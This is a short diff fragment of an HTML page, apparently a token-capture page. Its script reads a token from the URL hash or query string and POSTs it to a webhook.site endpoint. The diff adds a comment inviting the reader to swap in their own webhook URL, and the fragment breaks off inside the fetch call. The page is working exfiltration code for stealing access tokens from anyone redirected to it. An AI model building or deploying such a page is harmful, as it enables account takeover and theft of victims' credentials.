@@ -7,7 +7,8 @@
   <h2>Processing token…</h2>
   <script>
     const token = window.location.hash || window.location.search;
-
+  
+    //**************** Replace this with your own webhook URL (e.g., from webhook.site)***************//
     fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
